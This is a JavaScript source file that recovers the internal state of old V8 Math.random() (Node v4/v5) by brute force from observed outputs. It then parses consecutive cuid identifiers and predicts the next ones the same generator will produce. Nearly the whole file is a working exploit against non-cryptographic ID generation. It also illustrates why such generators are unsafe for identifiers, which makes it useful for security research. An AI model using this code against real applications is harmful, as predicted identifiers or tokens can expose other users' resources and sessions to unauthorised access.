const v8Version = process.versions.v8;
console.log('V8 Engine version', v8Version);
console.assert(v8Version >= '3.24.40' && v8Version <= '4.9.40', 'Unsupported V8 engine');
console.log();

// In 3.30.37 the constants changed in deps/v8/src/math.js: https://github.com/nodejs/node/commit/5d1b6d3e0fa4b97a490ef964be48aed9872e3ec1
const mult0 = (v8Version >= '3.30.37') ? 18030 : 180273;
const mult1 = 36969;
export default class ReplicatedRandom {
  constructor() {
    this.rngstate = [0, 0]; // rngstate is two 32 bit integers that needs to be initialized with `this.replicateState`
  }

  // Equivalent to the implementation of Math.random() in Node v4 or v5 but uses our own rngstate
  // Adapted from https://github.com/v8/v8/blob/4.6.85/src/math.js#L131
  nextDouble() {
    this.rngstate[0] = this._step(this.rngstate[0], mult0);
    this.rngstate[1] = this._step(this.rngstate[1], mult1);
    return this.getDouble();
  }
  // Same as nextDouble() except without stepping the state
  getDouble() {
    return this._toDouble(this.rngstate[0], this.rngstate[1]);
  }
  // Get the next rngstate
  _step(r, constant) {
    return (Math.imul(constant, r & 0xFFFF) + (r >>> 16)) | 0;
  }
  // Converts the rngstate to a double
  _toDouble(r0, r1) {
    // Concat lower 16 bits of rngstate[0] and rngstate[1]
    const x = ((r0 << 16) + (r1 & 0xFFFF)) | 0;
    // Division by 0x100000000 through multiplication by reciprocal.
    return (x < 0 ? (x + 0x100000000) : x) * 2.3283064365386962890625e-10;
  }


  // Replicates a stream of Math.random() values which are known to some precisionBits.
  // isCorrect is used to filter the guesses
  replicateState(mathRandoms, precisionBits = 32, isCorrect = null) {
    console.assert(mathRandoms.length >= 2);

    const xs = mathRandoms.map((d) => (d * 0x100000000) | 0);

    // Our x's have 32 bits of precision (16 from each rngstate).
    // For simplicity we assume the top 16 bits are completely correct and the bottom 16 bits have a known and unknown part
    console.assert(precisionBits >= 16);
    const unknownBits = 32 - precisionBits;
    console.assert(0 <= unknownBits && unknownBits <= 16);
    const mask16 = 0xFFFF;
    const unknownMask = (1 << unknownBits) - 1;
    const knownMask = mask16 - unknownMask;

    if (!isCorrect) {
      console.assert(precisionBits === 32);
      isCorrect = (double, i) => {
        return mathRandoms[i] === double;
      };
    }

    // Due to rounding, the top known bits of x might still be wrong (e.g 0.0999 -> 0.1000) so try to search around it
    const rounding_error = 1 << unknownBits;
    for (let e1 = 0; e1 <= rounding_error; e1 += rounding_error) {
      const first_x = xs[0] + e1;
      for (let e2 = 0; e2 <= rounding_error; e2 += rounding_error) {
        const second_x = xs[1] + e2;

        // The upper 16 bits of x gives us the lower 16 bits of r0 (aka rngstate[0]).
        // Bruteforce the remaining upper 16 bits of r0.
        const r0_candidates = [];
        const first_r0_lower = first_x >>> 16;
        const second_r0_lower = second_x >>> 16;
        for (let first_r0_upper = 0; first_r0_upper <= mask16; first_r0_upper++) {
          const first_r0 =  (first_r0_upper << 16) | first_r0_lower;
          const second_r0 = this._step(first_r0, mult0);
          if ((second_r0 & mask16) === second_r0_lower) {
            r0_candidates.push(first_r0);
          }
        }
        if (!r0_candidates.length) {
          continue;
        }

        // Precompute a few iterations of rngstate[0]
        const r0s = [r0_candidates[0]];
        for (let i = 1; i < mathRandoms.length; i++) {
          const next_r0 = this._step(r0s[r0s.length - 1], mult0);
          r0s.push(next_r0);
        }

        // The lower 16 bits of x gives us the lower 16 bits of r1 (aka rngstate[1]).
        // Bruteforce the remaining upper 16 bits of r1.
        // Also need to bruteforce parts of the lower 16 bits of r1 that are not fully known due to lost of precision.
        const r1_candidates = [];
        const first_r1_lower_known = first_x & knownMask;
        for (let first_r1_lower_unknown = 0; first_r1_lower_unknown <= unknownMask; first_r1_lower_unknown++) {
          const first_r1_lower = first_r1_lower_known | first_r1_lower_unknown;
          for (let first_r1_upper = 0; first_r1_upper <= mask16; first_r1_upper++) {
            const first_r1 =  (first_r1_upper << 16) | first_r1_lower;

            let valid = true;
            let r1 = first_r1;
            for (let i = 0; i < xs.length; i++) {
              const r0 = r0s[i];
              const double = this._toDouble(r0, r1);
              if (!isCorrect(double, i)) {
                valid = false;
                break;
              }
              r1 = this._step(r1, mult1);
            }
            if (valid) {
              r1_candidates.push(first_r1);
            }
          }
        }

        if (r0_candidates.length >= 1 && r1_candidates.length >= 1) {
          console.log('Found seed candidates:', r0_candidates.length, r1_candidates.length);
          this.rngstate = [r0_candidates[0], r1_candidates[0]];
          return [r0_candidates, r1_candidates];
        }
      }
    }
    console.assert(false, 'Could not solve rngstate!');
    return [[], []];
  }
}
















/* Copied from https://github.com/ericelliott/cuid/blob/master/source/index.js */
let c = 0;
const blockSize = 4;
const base = 36;
const discreteValues = Math.pow(base, blockSize);
const pad = (str, size) => ('000000000' + str).slice(-size);
const randomBlock = function randomBlock (r) {
  return pad((r * discreteValues << 0).toString(base), blockSize);
};
const safeCounter = function () {
  c = c < discreteValues ? c : 0;
  return c++;
};
/* End copied */


const parseCuid = (id) => {
  console.assert(id[0] === 'c');
  const ts = id.slice(1, -16);
  const counter = parseInt(id.slice(-16, -12), base);
  const fingerprint = id.slice(-3 * blockSize, -2 * blockSize);
  const randomBlock1 = parseInt(id.slice(-2 * blockSize, -blockSize), base);
  const randomBlock2 = parseInt(id.slice(-blockSize), base);
  return { ts, counter, fingerprint, randomBlock1, randomBlock2 };
};

export const predictCuids = (cuids, n) => {
  if (cuids.length < 4) {
    console.warn('Needs around at least 4 consecutive cuids to solve for a unique rngstate');
  }

  const parsed = cuids.map((id) => parseCuid(id));

  // Recover the (truncated) Math.random()s that was used to create the random blocks
  const randomBlocks = [];
  for (let i = 0; i < parsed.length; i++) {
    if (i !== 0) {
      console.assert(parsed[i - 1].fingerprint === parsed[i].fingerprint, 'Must all have same fingerprint');
      console.assert(parsed[i - 1].counter + 1 === parsed[i].counter, 'Must be consecutive cuids');
    }
    randomBlocks.push(parsed[i].randomBlock1);
    randomBlocks.push(parsed[i].randomBlock2);
  }
  const roundedObservations = randomBlocks.map((x) => x / discreteValues); // get the original Math.random()s but with some lost of precision
  const precisionBits = Math.floor(Math.log2(discreteValues));

  // Solve
  const rr = new ReplicatedRandom();
  rr.replicateState(roundedObservations, precisionBits, (random, i) => {
    return (random * discreteValues << 0) === randomBlocks[i];
  });

  // Predict
  c = parsed[0].counter;
  const ts = parsed[0].ts.replace(/./g, ' '); // can't tell when id was generated. It should start search at parsed[parsed.length - 1].ts
  const fingerprint = parsed[0].fingerprint;
  const makeCuid = (double1, double2) => {
    return (
      'c' +
      ts +
      pad((safeCounter() % discreteValues).toString(base), blockSize) +
      fingerprint +
      randomBlock(double1) +
      randomBlock(double2)
    );
  };
  const ret = [];
  ret.push(makeCuid(rr.getDouble(), rr.nextDouble()));
  for (let i = 1; i < n; i++) {
    ret.push(makeCuid(rr.nextDouble(), rr.nextDouble()));
  }
  return ret;
};
